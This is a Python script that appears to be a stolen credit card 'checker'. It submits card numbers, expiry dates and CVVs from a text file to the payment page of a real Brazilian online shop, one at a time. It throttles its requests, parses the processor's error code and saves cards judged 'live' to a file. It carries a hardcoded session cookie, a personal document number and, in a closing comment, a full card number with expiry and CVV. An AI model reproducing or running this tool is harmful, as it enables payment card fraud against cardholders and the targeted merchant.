import requests
import re
from bs4 import BeautifulSoup
import time

testadas = 0

url = 'https://www.bergonsi.com.br/finalizar-pedido/pagamento'

headers = {
    'Host': 'www.bergonsi.com.br',
    'Connection': 'keep-alive',
    'Keep-Alive': 'timeout=5, max=100',
    'Content-Length': '16233',
    'Cache-Control': 'max-age=0',
    'Origin': 'https://www.bergonsi.com.br',
    'Upgrade-Insecure-Requests': '1',
    'DNT': '1',
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-User': '?1',
    'Sec-Fetch-Dest': 'document',
    'Referer': 'https://www.bergonsi.com.br/finalizar-pedido/pagamento',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
    'Cookie': 'RockyAnalyticsToken=0c3757cd28e05dcf5fcc65c3f30d2517; rocky_shop=d940ki9q1tp65m3mpe0ahgai7t'
}

a = open('listadegg.txt', 'r')
file = [_.strip() for _ in a.readlines()]
for line in file:
    c = line.split('|')

    time.sleep(20)

    data = {

        'i': 'cielo',
        'payment_method': '2',
        'total': '47.2',
        'total_integer': '4720',
        'card_holder': 'Lucas Da Silva',
        'card_number': c[0],
        'card_brand': 'elo',
        'card_exp_date': f'{c[1]}/{c[2]}',
        'card_cvv': c[3],
        'card_doc': '44544451841',
        'installments': '1'
    }

    r = requests.post(url, headers=headers, data=data).text.encode('utf-8').decode('ascii', 'ignore')
    soup = BeautifulSoup(r, 'html.parser')
    retorno = soup.find('p', class_="alert alert-danger")

    regex = re.findall(r'Code:\s\w{2}', str(retorno))
    code = str(regex)

    ret = code.replace('[', '').replace(']', '').replace("'", '').strip()

    if retorno:
        if 'Code: 63' in ret:
            if c[0] not in open('lives.txt', 'r').read():
                print(f'\033[1;93m{c[0]}|{c[1]}|{c[2]}|{c[3]} --> {retorno.next_element}\033[m')
                b = open('lives.txt', 'a+')
                lv = b.writelines(f'\n{c[0]}|{c[1]}|{c[2]}|{c[3]}')
            else:
                print(f'\033[1;91m{c[0]}|{c[1]}|{c[2]}|{c[3]} --> {retorno.next_element} |REPETIDA\033[m')
        else:
            print(f'{c[0]}|{c[1]}|{c[2]}|{c[3]} --> {retorno.next_element}')

    elif "pgina inicial" in r:
        soup = BeautifulSoup(r, 'html.parser')
        print(f'{c[0]}|{c[1]}|{c[2]}|{c[3]} --> {soup.find("p", class_="account-info").next_element}')

    else:
        print(r)

    testadas += 1

    if testadas % 49 == 0:
        time.sleep(16)


# 5067283005160354|08|2024|760